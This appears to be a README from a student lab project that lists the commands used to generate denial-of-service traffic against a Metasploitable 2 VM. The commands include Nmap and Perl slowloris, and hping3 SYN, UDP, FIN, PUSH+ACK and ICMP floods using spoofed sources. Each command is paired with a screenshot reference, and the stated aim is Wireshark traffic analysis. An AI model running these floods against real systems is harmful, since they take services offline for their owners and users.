# Attack Commands

These commands were used only in a controlled VirtualBox lab against Metasploitable 2. Replace `TARGET_IP` and `TARGET_PORT` with the values from an authorized lab environment.

## Slowloris with Nmap NSE

```bash
nmap --script http-slowloris TARGET_IP
```

Evidence:

![Slowloris Nmap script](screenshots/02-slowloris-nmap.png)

## Slowloris Perl Version

```bash
git clone https://github.com/GHubgenius/slowloris.pl.git
cd slowloris.pl
ls
perl slowloris.pl -dns TARGET_IP
```

Evidence:

![Slowloris GitHub clone](screenshots/03-slowloris-github-clone.png)

![Slowloris Perl run](screenshots/03-slowloris-github-run.png)

## TCP SYN Flood

```bash
sudo hping3 -S --flood -V -p TARGET_PORT TARGET_IP
```

Evidence:

![SYN flood terminal](screenshots/04-syn-flood-terminal.png)

## UDP Flood

```bash
sudo hping3 --flood --rand-source --udp -p TARGET_PORT TARGET_IP
```

Evidence:

![UDP flood terminal](screenshots/05-udp-flood-terminal.png)

## TCP FIN Flood

```bash
sudo hping3 -S --flood --rand-source -F -p TARGET_PORT TARGET_IP
```

Evidence:

![FIN flood terminal](screenshots/06-fin-flood-terminal.png)

## TCP PUSH+ACK Flood

```bash
sudo hping3 -S --flood --rand-source -PA -p TARGET_PORT TARGET_IP
```

Evidence:

![PUSH+ACK flood terminal](screenshots/07-push-ack-terminal.png)

## ICMP Flood

```bash
sudo hping3 -S --flood --rand-source -1 -p TARGET_PORT TARGET_IP
```

Evidence:

![ICMP flood terminal](screenshots/08-icmp-flood-terminal.png)

## Defensive Use

The purpose of documenting these commands is to connect generated lab traffic with packet-level indicators in Wireshark. The value of this project is the analysis of traffic behavior, not attack execution.
